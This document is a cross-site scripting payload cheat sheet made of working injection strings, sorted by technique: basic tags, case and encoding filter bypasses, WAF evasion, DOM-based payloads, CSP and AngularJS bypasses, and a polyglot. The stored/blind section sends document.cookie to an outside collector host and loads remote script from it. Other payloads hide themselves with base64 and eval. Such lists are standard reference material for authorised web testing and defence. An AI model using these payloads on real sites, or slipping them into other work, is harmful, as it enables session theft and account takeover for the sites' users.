# XSS Payloads

## Basic
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

## Filter Bypass — Case & Encoding
```
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
<svg/onload=alert(1)>
<svg	onload=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
<script>alert`1`</script>
```

## Bypass — Keyword Filters (alert blocked)
```
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(document.cookie)</script>
<script>(()=>{})``</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
```

## Bypass — WAF / Stripped Tags
```
<<script>alert(1)//<</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>al\u0065rt(1)</script>
<script>al&#101;rt(1)</script>
"><img src=x onerror=alert(1)>
'><svg onload=alert(1)>
```

## Bypass — Quotes Blocked
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<script>alert(String.fromCharCode(49))</script>
<script>alert(/XSS/.source)</script>
```

## DOM-Based
```
#<img src=x onerror=alert(1)>
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## Stored / Blind XSS
```
<script src=https://YOUR-COLLAB/xss.js></script>
<img src=x onerror=this.src='https://YOUR-COLLAB/?c='+document.cookie>
<svg onload="fetch('https://YOUR-COLLAB/?c='+document.cookie)">
"><script>new Image().src='https://YOUR-COLLAB/?c='+document.cookie</script>
```

## CSP Bypass
```
<script nonce=LEAKED_NONCE>alert(1)</script>
<link rel=preload as=script href=data:,alert(1)>
<base href=https://evil.com>
<script src=https://allowed-cdn.com/angular.js></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
```

## AngularJS SSTI → XSS
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{7*7}}
```

## Polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```
